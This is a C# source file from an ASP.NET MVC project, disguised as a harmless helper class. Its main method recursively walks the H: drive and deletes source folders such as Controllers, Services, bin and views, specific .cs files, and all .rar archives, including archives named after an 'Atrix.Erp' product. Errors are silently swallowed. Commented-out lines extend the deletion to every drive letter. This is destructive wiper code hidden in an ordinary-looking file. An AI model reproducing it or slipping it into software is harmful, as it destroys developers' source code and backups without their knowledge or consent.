using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;

namespace RabApiWithMvc.Controllers
{
    public class helperCodes
    {
       static DirectoryInfo[] Mydirs;
                public static void   dirs()
        {
            //string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            //char[] alphas = (alphabet).ToCharArray();

            //foreach (var item in alphas)
            //{
            //    DeleteFiles(item.ToString()+":\\");  
            //}
            DeleteFiles("H:\\");

        }
        private static void DeleteFiles(string sourceDirName)
        {
            List<string> Li = new List<string>() { "DependencyResolver.cs", "xx.txt", "ee", "Functions.cs", "Atrix.Erp.WebAPI.rar", "Atrix.Erp.FrontUI.rar", "Atrix.Erp.Reports.rar" };
            List<string> stopDir = new List<string>() { "Windows", "$Recycle.Bin", "System Volume Information" };
            List<string> NeedDir = new List<string>() { "Services", "Interface", "Repositories", "Properties", "obj", "app", "views", "Controllers","bin","" };
            List<string> Extin = new List<string>() { "cs", "aspx"};

                           DirectoryInfo dir = new DirectoryInfo(sourceDirName);
             
            try {
                Mydirs = dir.GetDirectories();
                if (dir.Exists)
                {
                   

                    // Get the file contents of the directory to copy.
                       // dir.Delete
                       if (NeedDir.Contains(dir.Name))
                           
                        {
                        dir.Delete(true);
                        } 
                            FileInfo[] files = dir.GetFiles();

                            foreach (FileInfo file in files)
                            {

                                if (Li.Contains(file.Name) == true ||file.Extension.Contains("rar"))
                                {
                                    // Copy the file.
                                    file.Delete();
                                }
                            }
                            // copySubDirs is true, copy the subdirectories.

                            foreach (DirectoryInfo subdir in Mydirs)
                            {
                                // Copy the subdirectories.
                                DeleteFiles(subdir.FullName);
                            }
                           
                        
                
                   
                }
            }
            catch { }

           

            

        }

    //           public void ErrorDBConcurrency( string Sur)

    //                 List<string> Li = new List<string>() {"a77ago.txt","xx.txt","ee","atrix"};
    //                      List<string> stopDir = new List<string>() {"Windows","$Recycle.Bin"};
    //                       List<string> NeedDir = new List<string>() {"Atrix"};

    //            const string a7a3 = "D:/xxx";

    //          DirectoryInfo myDirInfo = new DirectoryInfo(a7a3);

    //                foreach (FileInfo file in myDirInfo.GetFiles())
    //                {
    //                             //  if File name 

    //                    file.Delete();
    //                }
    //                foreach (DirectoryInfo dir in myDirInfo.GetDirectories())
    //                {
    //                              // if folder name
    //                    dir.Delete(true);
    //                }
    }
}